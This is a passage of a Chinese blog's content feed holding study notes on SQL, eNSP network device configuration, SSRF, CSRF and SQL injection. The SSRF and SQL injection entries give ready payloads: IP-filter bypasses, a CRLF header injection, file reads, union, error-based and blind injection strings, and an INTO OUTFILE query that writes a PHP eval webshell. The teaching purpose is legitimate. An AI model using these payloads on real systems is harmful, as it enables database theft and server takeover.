desc降序,asc升序,默认升序</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> info (username,age) <span class="keyword">values</span> (<span class="string">&#x27;w1ndy&#x27;</span>,<span class="number">18</span>);</span><br><span class="line"><span class="keyword">update</span> info <span class="keyword">set</span> age<span class="operator">=</span><span class="number">19</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;w1ndy&#x27;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> info <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;w1ndy&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;w%&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="string">&#x27;w1ndy&#x27;</span>,<span class="string">&#x27;w2ndy&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info1</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info2; <span class="comment">-- union自动去重,union all不去重</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">into</span> stu <span class="keyword">from</span> info; <span class="comment">-- 复制info的username列插入到stu中</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> info2 (username,age) <span class="keyword">select</span> username,age <span class="keyword">from</span> info1; <span class="comment">-- 复制info1的数据到info2</span></span><br><span class="line"><span class="keyword">create</span> index myIndex <span class="keyword">on</span> info (username,age); <span class="comment">-- 创建索引,方便快速查询，不用查询全表</span></span><br><span class="line"><span class="keyword">drop</span> index myIndex; <span class="comment">-- Oracle语法</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> info2;</span><br><span class="line"><span class="keyword">drop</span> database users;</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> info2; <span class="comment">-- 只清空表数据，不删除表结构</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> height <span class="type">float</span>; <span class="comment">-- 添加列height</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> <span class="keyword">column</span> height; <span class="comment">-- 删除列height</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">alter</span> <span class="keyword">column</span> height <span class="type">int</span>; <span class="comment">-- 修改列的类型</span></span><br><span class="line">id <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="comment">-- 从1每次自增长1,sql server语法</span></span><br><span class="line">id auto_increment <span class="comment">-- 从1每次自增长1,mysql语法</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> myview <span class="keyword">as</span> <span class="keyword">select</span> username <span class="keyword">from</span> info; <span class="comment">-- 创建视图</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> myview; <span class="comment">-- 查询视图</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> myview;</span><br><span class="line">ISNULL(username,<span class="number">0</span>) <span class="comment">-- sql server中NULL判断函数，如果username为NULL则返回0,oracle中为NVL(),mysql中为IFNULL()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置FireWall</title>
      <link href="/article/d892e211.html"/>
      <url>/article/d892e211.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261746036.png"></p><h3 id="将端口加入到安全域"><a href="#将端口加入到安全域" class="headerlink" title="将端口加入到安全域"></a>将端口加入到安全域</h3><p>分为三个安全域：DMZ、trust、untrust</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">interface g 0/0/0</span><br><span class="line">ip address 172.16.1.3 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 192.168.10.1 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">interface g 0/0/2</span><br><span class="line">ip address 222.222.222.30 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">firewall zone dmz</span><br><span class="line">add interface g 0/0/0</span><br><span class="line">quit</span><br><span class="line">firewall zone trust</span><br><span class="line">add interface g 0/0/1</span><br><span class="line">quit</span><br><span class="line">firewall zone untrust</span><br><span class="line">add interface g 0/0/2</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置Switch</title>
      <link href="/article/c70deb04.html"/>
      <url>/article/c70deb04.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261409592.png"></p><h3 id="PC1-和-PC2-在同一个vlan"><a href="#PC1-和-PC2-在同一个vlan" class="headerlink" title="PC1 和 PC2 在同一个vlan"></a>PC1 和 PC2 在同一个vlan</h3><p>交换机配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">vlan 10 # 创建一个vlan，编号为10</span><br><span class="line">interface g 0/0/1</span><br><span class="line">port link-type access   # 0/0/1端口设置为access口</span><br><span class="line">port default vlan 10    # 将0/0/1端口加入到vlan 10中</span><br><span class="line">interface g 0/0/2</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 10</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261415322.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261416797.png"></p><h3 id="PC1-和-PC2-不在同一个vlan"><a href="#PC1-和-PC2-不在同一个vlan" class="headerlink" title="PC1 和 PC2 不在同一个vlan"></a>PC1 和 PC2 不在同一个vlan</h3><p>交换机配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">vlan 10 # 划分一个vlan，编号为10</span><br><span class="line">interface g 0/0/1</span><br><span class="line">port link-type access   # 0/0/1端口设置为access口</span><br><span class="line">port default vlan 10    # 将0/0/1端口划分到vlan 10中</span><br><span class="line">vlan 20</span><br><span class="line">interface g 0/0/2</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 20</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261418979.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261419774.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置Router</title>
      <link href="/article/ed365239.html"/>
      <url>/article/ed365239.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221126094.png"><br>路由器AR1配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys                                       进入系统视图</span><br><span class="line">sysname AR1                               设置设备主机名</span><br><span class="line">interface g 0/0/0                         配置AR1的0/0/0端口</span><br><span class="line">ip address 192.168.1.1 24                 配置0/0/0端口IP</span><br><span class="line">interface g 0/0/1                         配置AR1的0/0/1端口</span><br><span class="line">ip address 10.10.1.1 24                   配置0/0/1端口IP</span><br><span class="line">ip route-static 192.168.2.0 24 10.10.1.2  设置静态路由(目标网络 下一跳)</span><br></pre></td></tr></table></figure><p>路由器AR2配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sysname AR2</span><br><span class="line">interface g 0/0/0</span><br><span class="line">ip address 10.10.1.2 24</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 20.20.1.1 24</span><br><span class="line">ip route-static 192.168.2.0 24 20.20.1.2  从192.168.1.0 -&gt; 192.168.2.0</span><br><span class="line">ip route-static 192.168.1.0 24 10.10.1.1  从192.168.2.0 -&gt; 192.168.1.0</span><br></pre></td></tr></table></figure><p>路由器AR3配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sysname AR3</span><br><span class="line">interface g 0/0/0</span><br><span class="line">ip address 20.20.1.2 24</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 192.168.2.1 24</span><br><span class="line">ip route-static 192.168.1.0 24 20.20.1.1</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221208758.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221209145.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/article/813434ca.html"/>
      <url>/article/813434ca.html</url>
      
        <content type="html"><![CDATA[<p>SSRF(服务端请求伪造)，攻击者将恶意请求发给服务器，服务器执行该请求获取内网资源。SSRF通常用于外部网络无法直接访问的内部资源。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303231939285.jpg"></p><h3 id="0x00-PHP中SSRF危险函数与协议"><a href="#0x00-PHP中SSRF危险函数与协议" class="headerlink" title="0x00 PHP中SSRF危险函数与协议"></a>0x00 PHP中SSRF危险函数与协议</h3><ul><li>file_get_contents()</li><li>fsockopen()</li><li>curl_exec()</li><li>file:&#x2F;&#x2F;   读取文件，如 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</li><li>dict:&#x2F;&#x2F;   访问资源，如 dict:&#x2F;&#x2F;&#x2F;192.168.0.1:6739&#x2F;info</li><li>gopher:&#x2F;&#x2F; 分布式文档传递服务，可用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>生成payload</li></ul><h3 id="0x01-利用方式"><a href="#0x01-利用方式" class="headerlink" title="0x01 利用方式"></a>0x01 利用方式</h3><ul><li>内网端口扫描</li><li>内网应用及服务漏洞扫描</li><li>若PHP安装了expect扩展，可利用expect协议命令执行</li><li>DOS攻击</li><li>file协议暴力枚举敏感文件</li></ul><h3 id="0x01-防御手段"><a href="#0x01-防御手段" class="headerlink" title="0x01 防御手段"></a>0x01 防御手段</h3><ul><li>过滤返回的信息</li><li>同意报错信息</li><li>限制请求端口</li><li>限制访问IP</li><li>禁用不常用协议</li></ul><h3 id="IP过滤绕过"><a href="#IP过滤绕过" class="headerlink" title="IP过滤绕过"></a>IP过滤绕过</h3><h4 id="IP改写-192-168-0-1"><a href="#IP改写-192-168-0-1" class="headerlink" title="IP改写(192.168.0.1)"></a>IP改写(192.168.0.1)</h4><ul><li>8进制：0300.0250.0.1</li><li>16进制：0xc0.0xa8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xc0a80001</li><li>合并后两位：1.1.278 &#x2F; 1.1.755</li><li>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</li></ul><h4 id="CRLF编码-HTTP头部注入"><a href="#CRLF编码-HTTP头部注入" class="headerlink" title="CRLF编码(HTTP头部注入)"></a>CRLF编码(HTTP头部注入)</h4><p>通过添加回车换行绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%0d --&gt; 0x0d --&gt; \r 回车</span><br><span class="line">%0a --&gt; 0x0a --&gt; \n 换行</span><br><span class="line">https://www.example.com?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/article/d12d6355.html"/>
      <url>/article/d12d6355.html</url>
      
        <content type="html"><![CDATA[<p>CSRF(跨站请求伪造)，攻击者盗用他人身份，以他人名义发送恶意请求。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303231725022.jpg"></p><h3 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h3><ul><li>用户登录了网站A</li><li>用户触发了攻击者构造的恶意请求</li></ul><h3 id="0x01-防御手段"><a href="#0x01-防御手段" class="headerlink" title="0x01 防御手段"></a>0x01 防御手段</h3><ul><li>重要请求操作设置二次认证</li><li>设置合适的会话超时时间</li><li>重要请求操作尽量使用POST</li><li>CSRF-Token</li><li>SOP(同源策略)，检查HTTP请求头中Referer字段是否合法</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL-Injection</title>
      <link href="/article/2030ee36.html"/>
      <url>/article/2030ee36.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-联合查询注入"><a href="#0x00-联合查询注入" class="headerlink" title="0x00 联合查询注入"></a>0x00 联合查询注入</h3><p>利用前提：页面中有显示位</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>在可能的变量注入点后面添加payload: and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）<br>单引号判断(‘)显示数据库错误信息或者页面回显不同（整形、字符串类型判断）<br>(\) 转义符<br>-1&#x2F;+1 回显下一个或上一个页面（整型判断）<br>注：加号’+’在URL中有特殊含义，因此在需要对其URL编码为%2b</p><h4 id="判断是整形还是字符型"><a href="#判断是整形还是字符型" class="headerlink" title="判断是整形还是字符型"></a>判断是整形还是字符型</h4><p>分别测试 and 1&#x3D;1 和 and 1&#x3D;2<br>页面没有变化，则判断不是整型注入；页面发生变化，则判断为字符注入</p><table><thead><tr><th align="center">$id</th><th align="center">数字型(id&#x3D;$id)</th><th align="center">字符型(id&#x3D;’$id’)</th></tr></thead><tbody><tr><td align="center">1 and 1&#x3D;1</td><td align="center">id&#x3D;1 and 1&#x3D;1 返回正常</td><td align="center">id&#x3D;’1 and 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 and 1&#x3D;2</td><td align="center">id&#x3D;1 and 1&#x3D;2 返回错误</td><td align="center">id&#x3D;’1 and 1&#x3D;2’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;1</td><td align="center">id&#x3D;1 or 1&#x3D;1 返回正常</td><td align="center">id&#x3D;’1 or 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;2</td><td align="center">id&#x3D;1 or 1&#x3D;2返回正常</td><td align="center">id&#x3D;’1 or 1&#x3D;2’ 返回正常</td></tr><tr><td align="center">1’</td><td align="center">id&#x3D;1’ 返回错误</td><td align="center">id&#x3D;’1’’ 返回错误</td></tr><tr><td align="center">1’ –+</td><td align="center">id&#x3D;1’ –+ 返回错误</td><td align="center">id&#x3D;’1’ –+’ 返回正常</td></tr></tbody></table><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>通过 id&#x3D;1 order by 10#使用二分法猜解列数</p><h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA)#</span><br></pre></td></tr></table></figure><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;database&#x27;</span>)#</span><br></pre></td></tr></table></figure><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dbName&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;tableName&#x27;</span>)#</span><br></pre></td></tr></table></figure><h4 id="获取列中信息"><a href="#获取列中信息" class="headerlink" title="获取列中信息"></a>获取列中信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;-&#x27;</span>,password) <span class="keyword">from</span> tableName)#</span><br></pre></td></tr></table></figure><h4 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h4><ol><li>查看mysql读写文件的设置<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">secure_file_priv取值</th><th align="center">读写状态</th></tr></thead><tbody><tr><td align="center">NULL</td><td align="center">禁止读写</td></tr><tr><td align="center">空</td><td align="center">允许读写</td></tr><tr><td align="center">路径</td><td align="center">只能在该路径下读写</td></tr></tbody></table></li><li>读写文件的前提：</li></ol><ul><li>secure_file_priv 为空</li><li>知道文件的绝对路径</li><li>web目录有读写权限</li></ul><ol start="3"><li>在配置文件 mysql&#x2F;bin&#x2F;my.ini 中可通过添加<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure>来置空以实现任意位置读写</li><li>读取静态文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;C:/a/b/c.txt&#x27;</span>)#</span><br></pre></td></tr></table></figure></li><li>读取PHP文件<br>php环境下直接读取php文件，文件会被解析而无法打印出来，所以需要将文件内容编码<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,hex(load_file(<span class="string">&#x27;path&#x27;</span>))#</span><br></pre></td></tr></table></figure></li><li>写入文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">into</span> outfile <span class="string">&#x27;C:/a/b/c.txt&#x27;</span>;</span><br><span class="line">或者</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php eval($_POST[123]); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/a/b/c.php&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x01-报错型注入"><a href="#0x01-报错型注入" class="headerlink" title="0x01 报错型注入"></a>0x01 报错型注入</h3><p>适用于无回显但有错误信息输出的情况</p><h4 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h4><ol><li>extractvalue()<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; and (extractvalue(&#x27;</span>anything<span class="string">&#x27;,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select version())))) --+</span></span><br></pre></td></tr></table></figure></li><li>updatexml()<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; and (updatexml(&#x27;</span>anything<span class="string">&#x27;,(select database()),&#x27;</span>anything<span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure></li><li>floor()</li></ol><ul><li>rand() : 产生一个伪随机序列</li><li>count() : 返回指定列的数目</li><li>group by : 结合计数函数，根据列对结果进行分组<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x02-布尔盲注"><a href="#0x02-布尔盲注" class="headerlink" title="0x02 布尔盲注"></a>0x02 布尔盲注</h3><p>无错误回显，返回true或false</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">length()</td><td align="center">返回长度</td></tr><tr><td align="center">substr(str,pos,len)</td><td align="center">字符串截取</td></tr><tr><td align="center">mid(str,pos,len)</td><td align="center">字符串截取</td></tr><tr><td align="center">ascii()</td><td align="center">返回字符ASCII码</td></tr><tr><td align="center">ord()</td><td align="center">返回A字符SCII码</td></tr><tr><td align="center">if(a,b,c)</td><td align="center">a为条件，为真返回b，为假返回c</td></tr></tbody></table><h4 id="猜解库名"><a href="#猜解库名" class="headerlink" title="猜解库名"></a>猜解库名</h4><ol><li>猜解数据库名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure></li><li>猜解数据库名<br>二分法逐个字符猜解<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span>#</span><br></pre></td></tr></table></figure></li></ol><h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><ol><li>猜解表的数量<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure></li><li>猜解表名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span># 猜解第一个表的表长</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span># 猜解第二个表的表长</span><br></pre></td></tr></table></figure></li><li>猜解表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">103</span>#</span><br></pre></td></tr></table></figure></li></ol><h4 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h4><ol><li>猜解字段数量<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">3</span>#</span><br></pre></td></tr></table></figure></li><li>猜解字段长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">7</span># 猜解第一个字段长度</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">7</span># 猜解第一个字段长度</span><br></pre></td></tr></table></figure></li><li>猜解字段名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span># 第一个字段的第一个字符</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span># 第一个字段的第二个字符</span><br></pre></td></tr></table></figure></li><li>猜解数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dvwa.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span 